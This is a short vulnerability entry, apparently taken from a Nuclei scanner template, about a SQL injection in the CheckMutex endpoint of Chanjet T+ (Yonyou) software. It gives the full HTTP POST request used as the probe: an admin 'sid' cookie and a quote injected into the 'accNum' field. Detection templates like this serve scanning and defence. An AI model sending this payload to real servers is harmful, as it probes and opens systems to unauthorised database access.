# Vulnerability: Chanjet Tplus CheckMutex - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`chanjet-tplus-checkmutex-sqli.yaml`)

## Description
There is an SQL injection vulnerability in the Changjetcrm financial crm system under Yonyou.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
Host: {{Hostname}}
Content-Type: text/plain
Cookie: ASP.NET_SessionId=; sid=admin

{"accNum": "6'", "functionTag": "SYS0104", "url": ""}
```

